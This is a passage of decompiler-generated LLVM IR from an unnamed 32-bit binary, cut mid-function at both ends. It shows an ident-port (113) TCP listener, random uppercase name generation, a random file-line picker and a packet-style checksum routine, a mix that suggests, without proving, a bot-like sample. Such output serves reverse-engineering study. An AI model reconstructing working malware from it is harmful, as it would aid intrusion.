  %v3_10000514 = icmp eq i8 %v3_1000050c, 1
  br i1 %v3_10000514, label %dec_label_pc_1000051c, label %dec_label_pc_10000548

dec_label_pc_1000051c:                            ; preds = %dec_label_pc_100004f0
  %v3_10000520 = load i32, i32* @global_var_10010478.10, align 4
  %v5_10000538 = call i32 @function_1000041c(i32 %v3_10000520, i32 ptrtoint ([30 x i8]* @global_var_1000d3c0.11 to i32), i32 %arg1, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_1000064c

dec_label_pc_10000548:                            ; preds = %dec_label_pc_100004f0
  store i32 268436812, i32* @lr, align 4
  %v0_10000548 = call i32 @function_10004afc()
  %v3_10000558 = icmp eq i32 %v0_10000548, 0
  br i1 %v3_10000558, label %dec_label_pc_10000560, label %dec_label_pc_1000056c

dec_label_pc_10000560:                            ; preds = %dec_label_pc_10000548
  br label %dec_label_pc_1000064c

dec_label_pc_1000056c:                            ; preds = %dec_label_pc_10000548
  %v3_10000570 = load i32, i32* @global_var_10010468.13, align 4
  %v1_10000574 = add i32 %v3_10000570, 1
  store i32 %v1_10000574, i32* @global_var_10010468.13, align 4
  %v1_10000588 = mul i32 %v1_10000574, 4
  %v1_1000058c = add i32 %v1_10000588, 4
  store i32 %v1_1000058c, i32* @r3, align 4
  store i32 268436888, i32* @lr, align 4
  %v0_10000594 = call i32 @function_1000809c()
  %v3_100005f02 = load i32, i32* @global_var_10010468.13, align 4
  %v3_100005fc4 = icmp eq i32 %v3_100005f02, 1
  br i1 %v3_100005fc4, label %dec_label_pc_10000604, label %dec_label_pc_100005ac

dec_label_pc_100005ac:                            ; preds = %dec_label_pc_1000056c, %dec_label_pc_100005ac
  %storemerge16 = phi i32 [ %v1_100005e4, %dec_label_pc_100005ac ], [ 0, %dec_label_pc_1000056c ]
  %v1_100005b0 = mul i32 %storemerge16, 4
  %v2_100005bc = add i32 %v1_100005b0, %v0_10000594
  %v3_100005d0 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_100005d4 = add i32 %v3_100005d0, %v1_100005b0
  %v1_100005d8 = inttoptr i32 %v2_100005d4 to i32*
  %v2_100005d8 = load i32, i32* %v1_100005d8, align 4
  %v2_100005dc = inttoptr i32 %v2_100005bc to i32*
  store i32 %v2_100005d8, i32* %v2_100005dc, align 4
  %v1_100005e4 = add i32 %storemerge16, 1
  %v3_100005f0 = load i32, i32* @global_var_10010468.13, align 4
  %v1_100005f4 = add i32 %v3_100005f0, -1
  %v3_100005fc = icmp ugt i32 %v1_100005f4, %v1_100005e4
  br i1 %v3_100005fc, label %dec_label_pc_100005ac, label %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge

dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge: ; preds = %dec_label_pc_100005ac
  br label %dec_label_pc_10000604

dec_label_pc_10000604:                            ; preds = %dec_label_pc_1000056c, %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge
  %v3_10000608 = phi i32 [ %v3_100005f0, %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge ], [ %v3_100005f02, %dec_label_pc_1000056c ]
  %v1_1000060c = mul i32 %v3_10000608, 4
  %v2_10000618 = add i32 %v0_10000594, -4
  %v1_1000061c = add i32 %v2_10000618, %v1_1000060c
  %v2_10000624 = inttoptr i32 %v1_1000061c to i32*
  store i32 %v0_10000548, i32* %v2_10000624, align 4
  %v3_1000062c = load i32, i32* @global_var_1001048c.14, align 4
  store i32 %v3_1000062c, i32* @r3, align 4
  store i32 268437048, i32* @lr, align 4
  %v0_10000634 = call i32 @function_100081f4()
  store i32 %v0_10000594, i32* @global_var_1001048c.14, align 4
  br label %dec_label_pc_1000064c

dec_label_pc_1000064c:                            ; preds = %dec_label_pc_10000560, %dec_label_pc_1000051c, %dec_label_pc_10000604
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_1000051c ], [ 0, %dec_label_pc_10000560 ], [ %v0_10000548, %dec_label_pc_10000604 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v1_100005e4, { 1, 0 }
  uselistorder i32 %v1_100005b0, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v3_100005f02, { 1, 0 }
  uselistorder i32 %v0_10000594, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000064c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000604, { 1, 0 }
  uselistorder label %dec_label_pc_100005ac, { 1, 0 }
}

define i32 @function_1000066c() local_unnamed_addr {
dec_label_pc_1000066c:
  %v3_10000684 = load i8*, i8** @global_var_10010460.15, align 4
  %v4_10000684 = ptrtoint i8* %v3_10000684 to i32
  %v3_10000688 = icmp eq i8* %v3_10000684, null
  br i1 %v3_10000688, label %dec_label_pc_10000690, label %dec_label_pc_100006a0

dec_label_pc_10000690:                            ; preds = %dec_label_pc_1000066c
  store i32 268437140, i32* @lr, align 4
  %v0_10000690 = call i32 @function_100086d4()
  br label %dec_label_pc_10000704

dec_label_pc_100006a0:                            ; preds = %dec_label_pc_1000066c
  %v3_100006a4 = load i32, i32* @global_var_10010464.16, align 4
  %v3_100006a8 = icmp eq i32 %v3_100006a4, 1
  br i1 %v3_100006a8, label %dec_label_pc_100006b0, label %dec_label_pc_100006c8

dec_label_pc_100006b0:                            ; preds = %dec_label_pc_100006a0
  store i32 %v4_10000684, i32* @r3, align 4
  %v3_100006bc = call i32 @function_100079e4(i32 %v4_10000684, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10000704

dec_label_pc_100006c8:                            ; preds = %dec_label_pc_100006a0
  store i32 268437196, i32* @lr, align 4
  %v0_100006c8 = call i32 @function_100086d4()
  %v3_100006d8 = load i32, i32* @global_var_10010464.16, align 4
  %v2_100006dc = urem i32 %v0_100006c8, %v3_100006d8
  %v3_100006ec = load i8*, i8** @global_var_10010460.15, align 4
  %v4_100006ec = ptrtoint i8* %v3_100006ec to i32
  %v2_100006f0 = add i32 %v4_100006ec, %v2_100006dc
  %v1_100006f4 = add i32 %v2_100006f0, 1
  store i32 %v1_100006f4, i32* @r3, align 4
  %v2_100006fc = call i32 @function_100079e4(i32 %v1_100006f4, i32 %v2_100006f0)
  br label %dec_label_pc_10000704

dec_label_pc_10000704:                            ; preds = %dec_label_pc_100006b0, %dec_label_pc_10000690, %dec_label_pc_100006c8
  %stack_var_-24.0 = phi i32 [ %v0_10000690, %dec_label_pc_10000690 ], [ %v3_100006bc, %dec_label_pc_100006b0 ], [ %v2_100006fc, %dec_label_pc_100006c8 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_10000684, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_100079e4, { 1, 0 }
  uselistorder label %dec_label_pc_10000704, { 2, 0, 1 }
}

define i32 @function_10000724(i32 %arg1) local_unnamed_addr {
dec_label_pc_10000724:
  %v2_10000778 = add i32 %arg1, -1
  br label %dec_label_pc_10000764

dec_label_pc_10000740:                            ; preds = %dec_label_pc_10000790, %dec_label_pc_10000764
  store i32 %arg1, i32* @r3, align 4
  %v0_10000744 = call i32 @function_10007284()
  %v1_10000758 = add i32 %v0_10000744, %v2_10000778
  %v3_10000760 = inttoptr i32 %v1_10000758 to i8*
  store i8 0, i8* %v3_10000760, align 1
  br label %dec_label_pc_10000764

dec_label_pc_10000764:                            ; preds = %dec_label_pc_10000724, %dec_label_pc_10000740
  store i32 %arg1, i32* @r3, align 4
  %v0_10000768 = call i32 @function_10007284()
  %v1_1000077c = add i32 %v0_10000768, %v2_10000778
  %v1_10000780 = inttoptr i32 %v1_1000077c to i8*
  %v2_10000780 = load i8, i8* %v1_10000780, align 1
  %v3_10000788 = icmp eq i8 %v2_10000780, 13
  br i1 %v3_10000788, label %dec_label_pc_10000740, label %dec_label_pc_10000790

dec_label_pc_10000790:                            ; preds = %dec_label_pc_10000764
  store i32 %arg1, i32* @r3, align 4
  %v0_10000794 = call i32 @function_10007284()
  %v1_100007a8 = add i32 %v0_10000794, %v2_10000778
  %v1_100007ac = inttoptr i32 %v1_100007a8 to i8*
  %v2_100007ac = load i8, i8* %v1_100007ac, align 1
  %v3_100007b4 = icmp eq i8 %v2_100007ac, 10
  br i1 %v3_100007b4, label %dec_label_pc_10000740, label %dec_label_pc_100007bc

dec_label_pc_100007bc:                            ; preds = %dec_label_pc_10000790
  ret i32 %v0_10000794

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10000764, { 1, 0 }
}

define i32 @function_100007d4() local_unnamed_addr {
dec_label_pc_100007d4:
  %stack_var_-1076 = alloca i32, align 4
  store i32 268437488, i32* @lr, align 4
  %v0_100007ec = call i32 @function_100086d4()
  %v2_10000808 = srem i32 %v0_100007ec, 5
  %v1_10000824 = add nsw i32 %v2_10000808, 4
  %v1_10000830 = add nsw i32 %v2_10000808, 5
  store i32 %v1_10000830, i32* @r3, align 4
  store i32 268437564, i32* @lr, align 4
  %v0_10000838 = call i32 @function_1000809c()
  store i32 268437604, i32* @lr, align 4
  %v3_10000860 = call i32 @function_100071a0(i32 %v0_10000838, i32 0, i32 %v1_10000830)
  store i32 268437624, i32* @lr, align 4
  %v3_10000874 = call i32 @function_10004f90(i32 ptrtoint ([16 x i8]* @global_var_1000d3e0.17 to i32), i32 ptrtoint (i32* @global_var_1000d3f0.18 to i32))
  %v3_10000884 = icmp eq i32 %v3_10000874, 0
  br i1 %v3_10000884, label %dec_label_pc_100008fc.preheader, label %dec_label_pc_10000910

dec_label_pc_100008fc.preheader:                  ; preds = %dec_label_pc_100007d4
  %v2_100009048 = icmp sgt i32 %v2_10000808, -4
  br i1 %v2_100009048, label %dec_label_pc_10000898, label %dec_label_pc_10000a00

dec_label_pc_10000898:                            ; preds = %dec_label_pc_100008fc.preheader, %dec_label_pc_10000898
  %storemerge711 = phi i32 [ %v1_100008f4, %dec_label_pc_10000898 ], [ 0, %dec_label_pc_100008fc.preheader ]
  store i32 268437676, i32* @lr, align 4
  %v0_100008a8 = call i32 @function_100086d4()
  %v2_100008c4 = srem i32 %v0_100008a8, 26
  %fold = add nsw i32 %v2_100008c4, 65
  %v1_100008ec = trunc i32 %fold to i8
  %v2_100008ec = load i32, i32* @r29, align 4
  %v3_100008ec = inttoptr i32 %v2_100008ec to i8*
  store i8 %v1_100008ec, i8* %v3_100008ec, align 1
  %v1_100008f4 = add nuw nsw i32 %storemerge711, 1
  %v2_10000904 = icmp slt i32 %v1_100008f4, %v1_10000824
  br i1 %v2_10000904, label %dec_label_pc_10000898, label %dec_label_pc_10000a00

dec_label_pc_10000910:                            ; preds = %dec_label_pc_100007d4
  store i32 268437780, i32* @lr, align 4
  %v0_10000910 = call i32 @function_100086d4()
  store i32 268437788, i32* @lr, align 4
  %v0_10000918 = call i32 @function_100086d4()
  %v0_10000920 = load i32, i32* @r29, align 4
  %v2_10000920 = mul i32 %v0_10000920, %v0_10000918
  %v2_1000093c = srem i32 %v2_10000920, 45402
  %v2_1000099c12 = icmp sgt i32 %v2_1000093c, -1
  %v2_10000974 = ptrtoint i32* %stack_var_-1076 to i32
  br i1 %v2_1000099c12, label %dec_label_pc_10000974, label %dec_label_pc_100009a4

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000910, %dec_label_pc_10000974
  %storemerge615 = phi i32 [ %v1_1000098c, %dec_label_pc_10000974 ], [ 0, %dec_label_pc_10000910 ]
  store i32 268437896, i32* @lr, align 4
  %v3_10000984 = call i32 @function_1000694c(i32 %v2_10000974, i32 1024, i32 %v3_10000874)
  %v1_1000098c = add nuw nsw i32 %storemerge615, 1
  %v2_1000099c = icmp slt i32 %storemerge615, %v2_1000093c
  br i1 %v2_1000099c, label %dec_label_pc_10000974, label %dec_label_pc_100009a4

dec_label_pc_100009a4:                            ; preds = %dec_label_pc_10000974, %dec_label_pc_10000910
  store i32 268437948, i32* @lr, align 4
  %v3_100009b8 = call i32 @function_100071a0(i32 %v2_10000974, i32 0, i32 1024)
  store i32 268437968, i32* @lr, align 4
  %v3_100009cc = call i32 @function_1000694c(i32 %v2_10000974, i32 1024, i32 %v3_10000874)
  store i32 268437980, i32* @lr, align 4
  %v1_100009d8 = call i32 @function_10000724(i32 %v2_10000974)
  store i32 %v0_10000838, i32* @r3, align 4
  store i32 %v2_10000974, i32* @r4, align 4
  store i32 %v1_10000824, i32* @r5, align 4
  store i32 268438008, i32* @lr, align 4
  %v0_100009f4 = call i32 @function_10007104()
  store i32 268438016, i32* @lr, align 4
  %v1_100009fc = inttoptr i32 %v3_10000874 to i16*
  %v2_100009fc = call i32 @function_10004e44(i16* %v1_100009fc)
  br label %dec_label_pc_10000a00

dec_label_pc_10000a00:                            ; preds = %dec_label_pc_10000898, %dec_label_pc_100008fc.preheader, %dec_label_pc_100009a4
  ret i32 %v0_10000838

; uselistorder directives
  uselistorder i32 %v1_100008f4, { 1, 0 }
  uselistorder i32 %v0_10000838, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000a00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000974, { 1, 0 }
  uselistorder label %dec_label_pc_10000898, { 1, 0 }
}

define i32 @function_10000a24() local_unnamed_addr {
dec_label_pc_10000a24:
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-1216 = alloca i32, align 4
  %stack_var_-1196 = alloca i32, align 4
  %stack_var_-1204 = alloca i32, align 4
  %stack_var_-1212 = alloca i32, align 4
  store i32 268438088, i32* @lr, align 4
  %v3_10000a44 = call i32 @function_10008068(i32 2, i32 1, i32 0)
  %v4_10000a58 = icmp eq i32 %v3_10000a44, -1
  br i1 %v4_10000a58, label %dec_label_pc_10000d80, label %dec_label_pc_10000a60

dec_label_pc_10000a60:                            ; preds = %dec_label_pc_10000a24
  store i32 2, i32* %stack_var_-1212, align 4
  store i32 113, i32* @r3, align 4
  %v1_10000a6c = call i32 @function_100079f0(i32 113)
  %v2_10000a80 = ptrtoint i32* %stack_var_-1212 to i32
  %v2_10000a84 = ptrtoint i32* %stack_var_-1204 to i32
  store i32 0, i32* %stack_var_-1204, align 4
  store i32 268438188, i32* @lr, align 4
  %v4_10000aa8 = call i32 @function_10007f1c(i32 %v3_10000a44, i32 %v2_10000a80, i32 16, i32 %v2_10000a84)
  %v4_10000ab4 = icmp eq i32 %v4_10000aa8, -1
  br i1 %v4_10000ab4, label %dec_label_pc_10000d80, label %dec_label_pc_10000abc

dec_label_pc_10000abc:                            ; preds = %dec_label_pc_10000a60
  store i32 268438216, i32* @lr, align 4
  %v3_10000ac4 = call i32 @function_10007f84(i32 %v3_10000a44, i32 1, i32 %v4_10000aa8)
  %v4_10000ad0 = icmp eq i32 %v3_10000ac4, -1
  br i1 %v4_10000ad0, label %dec_label_pc_10000d80, label %dec_label_pc_10000ad8

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000abc
  store i32 268438236, i32* @lr, align 4
  %v0_10000ad8 = call i32 @function_10004afc()
  %v3_10000ae0 = icmp eq i32 %v0_10000ad8, 0
  br i1 %v3_10000ae0, label %dec_label_pc_10000d80, label %dec_label_pc_10000ae8

dec_label_pc_10000ae8:                            ; preds = %dec_label_pc_10000ad8
  store i32 16, i32* %stack_var_-1216, align 4
  %v2_10000af0 = ptrtoint i32* %stack_var_-1196 to i32
  %v2_10000af4 = ptrtoint i32* %stack_var_-1216 to i32
  store i32 268438280, i32* @lr, align 4
  %v4_10000b04 = call i32 @function_10007ee8(i32 %v3_10000a44, i32 %v2_10000af0, i32 %v2_10000af4, i32 %v2_10000af4)
  %v4_10000b18 = icmp eq i32 %v4_10000b04, -1
  br i1 %v4_10000b18, label %dec_label_pc_10000b20, label %dec_label_pc_10000b28.preheader

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000ae8
  %v0_10000b24 = call i32 @function_10008dd4()
  br label %dec_label_pc_10000b28.preheader

dec_label_pc_10000b28.preheader:                  ; preds = %dec_label_pc_10000b20, %dec_label_pc_10000ae8
  %v2_10000b28 = ptrtoint i32* %stack_var_-148 to i32
  %v1_10000b70 = udiv i32 %v4_10000b04, 32
  %v1_10000b78 = mul nuw nsw i32 %v1_10000b70, 4
  %v2_10000b7c = ptrtoint i32* %stack_var_-1240 to i32
  %v2_10000b80 = add i32 %v2_10000b7c, 1092
  %v1_10000b84 = add i32 %v2_10000b80, %v1_10000b78
  %v1_10000b88 = inttoptr i32 %v1_10000b84 to i32*
  %v1_10000b90 = urem i32 %v4_10000b04, 32
  %v3_10000b98 = shl i32 1, %v1_10000b90
  %v1_10000bc8 = add i32 %v4_10000b04, 1
  %v2_10000bd0 = ptrtoint i32* %stack_var_-156 to i32
  %v3_10000c24 = sub i32 0, %v4_10000b04
  %v4_10000c24 = urem i32 %v3_10000c24, 32
  %v6_10000c24 = xor i32 %v4_10000c24, 31
  %v12_10000c24 = lshr i32 -1, %v1_10000b90
  %v16_10000c24 = xor i32 %v12_10000c24, 1
  %v14_10000c24 = urem i32 %v12_10000c24, 2
  br label %dec_label_pc_10000b28

dec_label_pc_10000b28:                            ; preds = %dec_label_pc_10000b28.preheader, %dec_label_pc_10000c00
  store i32 %v2_10000b28, i32* %stack_var_-1240, align 4
  store i32 0, i32* %stack_var_-148, align 4
  br label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge

dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge: ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge, %dec_label_pc_10000b28
  %v3_10000b40.pre = phi i32 [ %v2_10000b28, %dec_label_pc_10000b28 ], [ %v3_10000b40.pre.pre, %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge ]
  %v1_10000b5830 = phi i32 [ 1, %dec_label_pc_10000b28 ], [ %v1_10000b58, %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge ]
  %v1_10000b44 = mul nuw nsw i32 %v1_10000b5830, 4
  %v2_10000b48 = add i32 %v1_10000b44, %v3_10000b40.pre
  %v2_10000b50 = inttoptr i32 %v2_10000b48 to i32*
  store i32 0, i32* %v2_10000b50, align 4
  %v1_10000b58 = add nuw nsw i32 %v1_10000b5830, 1
  %tmp25 = icmp ult i32 %v1_10000b58, 32
  br i1 %tmp25, label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge, label %dec_label_pc_10000b6c

dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge: ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge
  %v3_10000b40.pre.pre = load i32, i32* %stack_var_-1240, align 4
  br label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge

dec_label_pc_10000b6c:                            ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge
  %v2_10000b88 = load i32, i32* %v1_10000b88, align 4
  %v2_10000b9c = or i32 %v2_10000b88, %v3_10000b98
  store i32 %v2_10000b9c, i32* %v1_10000b88, align 4
  store i32 60, i32* %stack_var_-156, align 4
  store i32 268438508, i32* @lr, align 4
  %v6_10000be8 = call i32 @function_10004d38(i32 %v1_10000bc8, i32 %v2_10000b28, i32 0, i32 0, i32 %v2_10000bd0, i32 %v2_10000b28)
  %tmp26 = icmp sgt i32 %v6_10000be8, -1
  br i1 %tmp26, label %dec_label_pc_10000c00, label %dec_label_pc_10000bf8

dec_label_pc_10000bf8:                            ; preds = %dec_label_pc_10000b6c
  %v0_10000bfc = call i32 @function_10008dd4()
  br label %dec_label_pc_10000c00

dec_label_pc_10000c00:                            ; preds = %dec_label_pc_10000b6c, %dec_label_pc_10000bf8
  %v2_10000c18 = load i32, i32* %v1_10000b88, align 4
  %v5_10000c24 = shl i32 %v2_10000c18, %v4_10000c24
  %v7_10000c24 = lshr i32 %v2_10000c18, %v6_10000c24
  %v8_10000c24 = udiv i32 %v7_10000c24, 2
  %v9_10000c24 = or i32 %v8_10000c24, %v5_10000c24
  %tmp = icmp slt i32 %v2_10000c18, 0
  %v15_10000c242 = zext i1 %tmp to i32
  %v17_10000c24 = and i32 %v15_10000c242, %v16_10000c24
  %v14_10000c24.masked = and i32 %v14_10000c24, %v9_10000c24
  %v1_10000c2c = or i32 %v14_10000c24.masked, %v17_10000c24
  %v3_10000c30 = icmp eq i32 %v1_10000c2c, 0
  br i1 %v3_10000c30, label %dec_label_pc_10000b28, label %dec_label_pc_10000c3c

dec_label_pc_10000c3c:                            ; preds = %dec_label_pc_10000c00
  %v2_10000c3c = ptrtoint i32* %stack_var_-1180 to i32
  store i32 268438612, i32* @lr, align 4
  %v4_10000c50 = call i32 @function_10007fb4(i32 %v4_10000b04, i32 %v2_10000c3c, i32 1024, i32 0)
  %tmp27 = icmp slt i32 %v4_10000c50, 1
  br i1 %tmp27, label %dec_label_pc_10000c74, label %dec_label_pc_10000c68

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c3c
  %tmp28 = icmp slt i32 %v4_10000c50, 20
  br i1 %tmp28, label %dec_label_pc_10000c7c, label %dec_label_pc_10000c74

dec_label_pc_10000c74:                            ; preds = %dec_label_pc_10000c68, %dec_label_pc_10000c3c
  %v0_10000c78 = call i32 @function_10008dd4()
  br label %dec_label_pc_10000c7c

dec_label_pc_10000c7c:                            ; preds = %dec_label_pc_10000c68, %dec_label_pc_10000c74
  %v2_10000c84 = add i32 %v2_10000b7c, 60
  %v3_10000c8c = add i32 %v2_10000c84, %v4_10000c50
  %v4_10000c8c = inttoptr i32 %v3_10000c8c to i8*
  store i8 0, i8* %v4_10000c8c, align 1
  %v1_10000c94 = add i32 %v2_10000b7c, -1
  %v2_10000c9c = add i32 %v1_10000c94, %v4_10000c50
  %v1_10000ca0 = add i32 %v2_10000c9c, 60
  %v2_10000ca0 = inttoptr i32 %v1_10000ca0 to i8*
  %v3_10000ca0 = load i8, i8* %v2_10000ca0, align 1
  %v3_10000ca8 = icmp eq i8 %v3_10000ca0, 10
  br i1 %v3_10000ca8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000cb0

dec_label_pc_10000cb0:                            ; preds = %dec_label_pc_10000c7c
  %v3_10000cc0 = load i8, i8* %v2_10000ca0, align 1
  %v3_10000cc8 = icmp eq i8 %v3_10000cc0, 13
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000ce8

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cb0, %dec_label_pc_10000c7c
  store i8 0, i8* %v2_10000ca0, align 1
  br label %dec_label_pc_10000ce8

dec_label_pc_10000ce8:                            ; preds = %dec_label_pc_10000cb0, %dec_label_pc_10000cd0
  %v1_10000cec = add i32 %v2_10000b7c, -2
  %v2_10000cf4 = add i32 %v1_10000cec, %v4_10000c50
  %v1_10000cf8 = add i32 %v2_10000cf4, 60
  %v2_10000cf8 = inttoptr i32 %v1_10000cf8 to i8*
  %v3_10000cf8 = load i8, i8* %v2_10000cf8, align 1
  %v3_10000d00 = icmp eq i8 %v3_10000cf8, 10
  br i1 %v3_10000d00, label %dec_label_pc_10000d28, label %dec_label_pc_10000d08

dec_label_pc_10000d08:                            ; preds = %dec_label_pc_10000ce8
  %v3_10000d18 = load i8, i8* %v2_10000cf8, align 1
  %v3_10000d20 = icmp eq i8 %v3_10000d18, 13
  br i1 %v3_10000d20, label %dec_label_pc_10000d28, label %dec_label_pc_10000d40

dec_label_pc_10000d28:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000ce8
  store i8 0, i8* %v2_10000cf8, align 1
  br label %dec_label_pc_10000d40

dec_label_pc_10000d40:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000d28
  %v3_10000d44 = load i32, i32* @global_var_10010470.19, align 4
  %v6_10000d64 = call i32 @function_1000041c(i32 %v4_10000b04, i32 ptrtoint ([25 x i8]* @global_var_1000d3f4.20 to i32), i32 %v2_10000c3c, i32 %v3_10000d44)
  store i32 268438896, i32* @lr, align 4
  %v1_10000d6c = call i32 @function_10004ab4(i32 %v4_10000b04)
  store i32 ptrtoint ([3 x i8]* @global_var_10000d78.21 to i32), i32* @lr, align 4
  %v1_10000d74 = call i32 @function_10004ab4(i32 %v3_10000a44)
  %v0_10000d7c = call i32 @function_10008dd4()
  br label %dec_label_pc_10000d80

dec_label_pc_10000d80:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000abc, %dec_label_pc_10000a60, %dec_label_pc_10000a24, %dec_label_pc_10000d40
  %v0_10000d94 = phi i32 [ 0, %dec_label_pc_10000ad8 ], [ -1, %dec_label_pc_10000abc ], [ -1, %dec_label_pc_10000a60 ], [ -1, %dec_label_pc_10000a24 ], [ %v0_10000d7c, %dec_label_pc_10000d40 ]
  ret i32 %v0_10000d94

; uselistorder directives
  uselistorder i8* %v2_10000cf8, { 1, 0, 2 }
  uselistorder i8* %v2_10000ca0, { 1, 0, 2 }
  uselistorder i32 %v4_10000c50, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_10000c18, { 0, 2, 1 }
  uselistorder i32 %v1_10000b58, { 1, 0 }
  uselistorder i32 %v1_10000b90, { 1, 0 }
  uselistorder i32* %v1_10000b88, { 1, 0, 2 }
  uselistorder i32 %v2_10000b28, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10000b04, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32* %stack_var_-1212, { 1, 0 }
  uselistorder i32* %stack_var_-1216, { 1, 0 }
  uselistorder label %dec_label_pc_10000d80, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10000d40, { 1, 0 }
  uselistorder label %dec_label_pc_10000ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10000c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10000c00, { 1, 0 }
  uselistorder label %dec_label_pc_10000b28, { 1, 0 }
}

define i32 @function_10000d98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10000d98:
  %v3_10000db8 = icmp eq i32 %arg2, 0
  br i1 %v3_10000db8, label %dec_label_pc_10000dc0, label %dec_label_pc_10000dcc

dec_label_pc_10000dc0:                            ; preds = %dec_label_pc_10000d98
  br label %dec_label_pc_10000e08

dec_label_pc_10000dcc:                            ; preds = %dec_label_pc_10000d98
  %v3_10000dd0 = icmp eq i32 %arg2, 1
  br i1 %v3_10000dd0, label %dec_label_pc_10000dd8, label %dec_label_pc_10000de4

dec_label_pc_10000dd8:                            ; preds = %dec_label_pc_10000dcc
  br label %dec_label_pc_10000e08

dec_label_pc_10000de4:                            ; preds = %dec_label_pc_10000dcc
  %v1_10000de8 = add i32 %arg2, -1
  %v2_10000df4 = call i32 @function_10000d98(i32 %arg1, i32 %v1_10000de8)
  %v2_10000e00 = mul i32 %v2_10000df4, %arg1
  br label %dec_label_pc_10000e08

dec_label_pc_10000e08:                            ; preds = %dec_label_pc_10000dd8, %dec_label_pc_10000dc0, %dec_label_pc_10000de4
  %stack_var_-16.0 = phi i32 [ 1, %dec_label_pc_10000dc0 ], [ %arg1, %dec_label_pc_10000dd8 ], [ %v2_10000e00, %dec_label_pc_10000de4 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000e08, { 2, 0, 1 }
}

define i32 @function_10000e28(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10000e28:
  %v2_10000e945 = icmp sgt i32 %arg2, 1
  br i1 %v2_10000e945, label %dec_label_pc_10000e60, label %dec_label_pc_10000e9c

dec_label_pc_10000e60:                            ; preds = %dec_label_pc_10000e28, %dec_label_pc_10000e60
  %stack_var_-24.09 = phi i32 [ %v1_10000e88, %dec_label_pc_10000e60 ], [ %arg2, %dec_label_pc_10000e28 ]
  %stack_var_-28.08 = phi i16* [ %v5_10000e80, %dec_label_pc_10000e60 ], [ %arg1, %dec_label_pc_10000e28 ]
  %stack_var_-32.07 = phi i32 [ %v2_10000e70, %dec_label_pc_10000e60 ], [ 0, %dec_label_pc_10000e28 ]
  %v4_10000e60 = ptrtoint i16* %stack_var_-28.08 to i32
  %v2_10000e64 = load i16, i16* %stack_var_-28.08, align 2
  %v3_10000e64 = zext i16 %v2_10000e64 to i32
  %v2_10000e70 = add i32 %v3_10000e64, %stack_var_-32.07
  %v1_10000e7c = add i32 %v4_10000e60, 2
  %v5_10000e80 = inttoptr i32 %v1_10000e7c to i16*
  %v1_10000e88 = add nsw i32 %stack_var_-24.09, -2
  %v2_10000e94 = icmp sgt i32 %v1_10000e88, 1
  br i1 %v2_10000e94, label %dec_label_pc_10000e60, label %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge

dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge: ; preds = %dec_label_pc_10000e60
  %v3_10000e94.le = icmp eq i32 %v1_10000e88, 1
  br i1 %v3_10000e94.le, label %dec_label_pc_10000ea8, label %dec_label_pc_10000ed0

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e28
  %v3_10000e946 = icmp eq i32 %arg2, 1
  br i1 %v3_10000e946, label %dec_label_pc_10000ea8, label %dec_label_pc_10000ed0

